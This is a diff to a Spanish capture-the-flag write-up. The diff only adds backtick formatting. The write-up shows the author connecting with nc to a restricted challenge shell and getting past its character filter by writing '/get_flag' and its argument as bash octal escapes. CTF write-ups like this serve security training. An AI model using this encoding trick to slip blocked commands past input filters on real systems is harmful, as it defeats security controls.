@@ -16,7 +16,7 @@ Establezco conexión con el socket del servidor y me aparece un puntero a modo d
 root@blondbyte# nc 35.189.118.225 1337
 baby>
 ```
-Escribo help y me muestra un mensaje de bienvenida:
+Escribo `help` y me muestra un mensaje de bienvenida:
 ```
 baby> help
 
@@ -36,13 +36,13 @@ baby> help
 
 baby>
 ```
-Pruebo a escribir '/get_flag' y no me deja:
+Pruebo a escribir `/get_flag` y no me deja:
 ```
 baby> /get_flag
 Invalid character. Try 'help'.
 baby>
 ```
-Parece ser que necesito codificar los caracteres para que la shell los decodifique como '/get_flag'. Tras varias pruebas y búsquedas, codifico en octal con alguna tool online y le paso el resultado:
+Parece ser que necesito codificar los caracteres para que la shell los decodifique como `/get_flag`. Tras varias pruebas y búsquedas, codifico en octal con alguna tool online y le paso el resultado:
 ```
 baby> /$'\147\145\164_\146\154\141\147'
 Usage: /get_flag gimme_FLAG_please
@@ -55,7 +55,7 @@ baby> /$'\147\145\164_\146\154\141\147' gimme_FLAG_please
 Invalid character. Try 'help'.
 baby>
 ```
-Al parecer sigo bajo las condiciones iniciales. Codifico en octal el texto 'gimme_FLAG_please' a ver que pasa:
+Al parecer sigo bajo las condiciones iniciales. Codifico en octal el texto `gimme_FLAG_please` a ver que pasa:
 ```
 baby> /$'\147\145\164_\146\154\141\147' $'\147\151\155\155\145_FLAG_\160\154\145\141\163\145'
 Good job!
